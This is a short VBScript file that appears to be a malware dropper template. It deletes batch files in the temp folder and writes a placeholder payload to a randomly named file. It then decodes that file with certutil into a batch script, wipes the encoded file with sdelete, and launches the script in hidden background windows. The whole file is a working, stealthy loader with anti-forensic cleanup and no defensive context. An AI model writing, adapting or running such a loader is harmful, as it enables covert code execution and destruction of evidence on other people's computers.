Set WshShell = CreateObject("WScript.Shell")
f1=rnd()
f2=rnd()
WshShell.Run "cmd /c del %TEMP%\*.bat", 0, True
WshShell.Run "cmd /c echo [PAYLOAD] > %TEMP%\" & f1, 0, True
WshShell.Run "cmd /c certutil -decode %TEMP%\" & f1 & " %TEMP%\" & f2 & ".bat", 0, True
WshShell.Run "cmd /c %TEMP%\sdelete64.exe -p 2 %TEMP%\" & f1, 0, True
WshShell.Run "cmd /c start /B %TEMP%\" & f2 & ".bat", 0, True
Set WshShell = Nothing
